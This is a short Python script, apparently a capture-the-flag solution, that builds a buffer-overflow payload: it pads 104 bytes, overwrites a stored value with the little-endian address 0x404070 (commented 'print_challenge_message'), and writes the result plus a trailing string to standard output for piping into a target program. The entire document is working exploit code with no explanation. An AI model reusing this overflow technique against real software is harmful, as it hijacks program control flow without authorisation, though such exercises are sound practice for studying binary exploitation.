from struct import pack
import sys

ADDR_SUCCESS_ASCII = b"4199014"            # 0x401266
BUFFER_SIZE        = 0x68                  # pad out 104 bytes from buffer
ADDR_GLOBAL        = pack("<Q", 0x404070)  # print_challenge_message

p  = ADDR_SUCCESS_ASCII
p += b'!' * (BUFFER_SIZE - len(ADDR_SUCCESS_ASCII))
p += ADDR_GLOBAL
p += b'\n'

sys.stdout.buffer.write(p)
sys.stdout.buffer.write(b'xaq7pj\n')
